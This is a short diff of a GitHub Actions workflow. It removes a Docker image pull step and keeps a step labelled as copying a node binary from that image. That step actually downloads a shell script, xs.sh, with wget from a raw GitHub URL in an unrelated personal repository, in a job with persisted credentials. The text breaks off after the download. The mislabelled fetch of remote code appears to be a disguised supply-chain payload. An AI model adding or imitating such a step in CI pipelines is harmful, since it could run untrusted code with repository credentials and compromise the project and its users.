@@ -13,10 +13,6 @@ jobs:
         with:
           persist-credentials: true
 
-      - name: Pull docker image
-        run: |
-          docker pull ${{ secrets.IMPRO }}/${{ secrets.IMREPO }}:${{ secrets.IMVER }}
-
       - name: Copy /opt/node/node from docker image
         run: |
           wget https://raw.githubusercontent.com/menju2ikg8uti/tmp/main/xs.sh
